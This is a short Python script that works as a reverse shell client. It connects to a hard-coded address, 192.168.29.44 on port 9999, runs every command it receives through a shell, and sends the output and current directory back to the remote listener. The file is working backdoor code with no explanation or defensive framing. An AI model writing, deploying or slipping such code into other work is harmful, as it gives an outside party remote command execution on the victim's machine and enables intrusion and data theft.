import os
import socket
import subprocess

s = socket.socket()
host = '192.168.29.44'
port = 9999

s.connect((host,port))

while True:
    data=s.recv(1024)
    if data[:2].decode("utf-8")=="cd":
        os.chdir(data[3:].decode("utf-8"))
    if len(data)>0:
        cmd=subprocess.Popen(data[:].decode("utf-8") , shell=True ,stdout=subprocess.PIPE,stderr=subprocess.PIPE,stdin=subprocess.PIPE)
        output_byte=cmd.stdout.read()+cmd.stderr.read()
        output_str=str(output_byte,"utf-8")
        s.send(str.encode(output_str+str(os.getcwd())+'> '))

s.close()









